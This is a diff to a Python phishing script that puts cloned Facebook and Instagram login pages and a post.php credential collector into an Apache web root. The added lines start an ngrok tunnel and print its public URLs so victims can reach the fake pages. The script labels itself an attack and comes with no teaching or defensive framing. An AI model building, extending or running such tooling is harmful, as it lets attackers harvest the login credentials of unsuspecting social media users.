@@ -1,6 +1,9 @@
 #! usr/bin/python3
+import json
 import subprocess
 import time
+import os
+
 
 #create an ascii Banner
 def banner():
@@ -43,7 +46,21 @@ def start_facebook():
     subprocess.call(["cp", "-r", "/root/PycharmProjects/phishing/post.php", "/var/www/html"])
     #start apache server
     subprocess.call(["service","apache2","start"])
-    print("[+]Starting attack on port 80")
+    print("[+]starting ngrok service")
+    os.system("./ngrok http 80 > /dev/null &")
+    time.sleep(5)
+    #os.system("curl - s localhost: 4040 / api / tunnels | jq - r.tunnels[0].public_url")
+    os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
+
+    with open('tunnels.json') as data_file:
+        datajson = json.load(data_file)
+
+    msg = "ngrok URL's: \n"
+    for i in datajson['tunnels']:
+        msg = msg + i['public_url'] + '\n'
+
+    print(msg)
+
     print("[+]Website....www.facebook.com")
 def start_instagram():
     print("[+] Setting up some stuffs....")
@@ -56,6 +73,21 @@ def start_instagram():
     #start apache server
     subprocess.call(["service","apache2","start"])
     print("[+]Starting attack on port 80")
+    print("[+]starting ngrok service")
+    os.system("./ngrok http 80 > /dev/null &")
+    time.sleep(5)
+    #os.system("curl - s localhost: 4040 / api / tunnels | jq - r.tunnels[0].public_url")
+    os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
+
+    with open('tunnels.json') as data_file:
+        datajson = json.load(data_file)
+
+    msg = "ngrok URL's: \n"
+    for i in datajson['tunnels']:
+        msg = msg + i['public_url'] + '\n'
+
+    print(msg)
+
     print("[+]Website....www.instagram.com")
 
 
@@ -64,6 +96,7 @@ def get_input():
                                     1.Facebook
                                     2.Instagram""")
     a = int(input())
+
     return a
 
 #initiate the phishing attack
